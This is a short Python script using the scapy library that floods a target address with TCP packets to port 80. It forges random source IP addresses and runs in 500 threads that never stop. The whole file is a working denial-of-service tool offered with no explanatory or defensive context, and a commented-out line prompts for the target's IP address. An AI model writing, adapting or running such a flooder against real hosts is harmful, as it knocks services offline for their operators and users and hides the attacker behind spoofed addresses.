import random,threading
from scapy.all import *
#target_IP = input("Enter IP address of Target: ")
target_IP = "192.168.1.1"
def attack(target_IP,ports,verbose=False):
   i = 1
   if type(ports) == int:
      ports = [ports]

   while True:
      a = str(random.randint(1,254))
      b = str(random.randint(1,254))
      c = str(random.randint(1,254))
      d = str(random.randint(1,254))
      dot = "."
      source_IP = a + dot + b + dot + c + dot + d
      
      for source_port in ports:#range(1, 65535):
         IP1 = IP(src = source_IP, dst = target_IP)
         TCP1 = TCP(sport = source_port, dport = 80)
         pkt = IP1 / TCP1
         send(pkt,inter = .001,verbose=False)

         if verbose:
            print("packet {} with ip {} on port {}".format(i,source_IP,source_port))
         i + 1

ports = 30
for i in range(500): 
   thread = threading.Thread(target=attack,args=(target_IP,ports))
   thread.start()

print("Started")
